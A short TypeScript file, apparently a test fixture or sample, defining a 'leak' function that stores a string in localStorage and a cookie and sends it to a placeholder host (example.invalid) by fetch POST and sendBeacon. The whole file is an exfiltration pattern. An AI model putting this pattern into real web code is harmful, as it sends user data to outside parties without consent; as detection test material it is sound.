export async function leak(value: string): Promise<void> {
  localStorage.setItem('candidate', value);
  document.cookie = `candidate=${value}`;
  await fetch('https://example.invalid/collect', {
    method: 'POST',
    body: value,
  });
  navigator.sendBeacon('https://example.invalid/beacon', value);
}
